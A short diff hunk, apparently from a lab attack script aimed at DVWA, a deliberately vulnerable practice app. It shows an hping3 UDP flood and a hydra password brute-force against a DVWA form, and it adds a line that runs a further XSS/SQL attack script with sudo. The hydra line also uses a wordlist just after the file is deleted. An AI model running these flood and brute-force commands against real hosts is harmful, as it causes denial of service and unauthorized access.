@@ -44,3 +44,5 @@ sudo hping3 --udp -i u100 -p 53 -d 1000 -c 50000 $TARGET
 rm $WORDLIST
 
 hydra -P $WORDLIST $TARGET http-get-form "/DVWA/vulnerabilities/sqli/:id=^PASS^&Submit=Submit:F=ID doesn't exist" -V
+
+sudo ./xss_sql_attack_script.sh
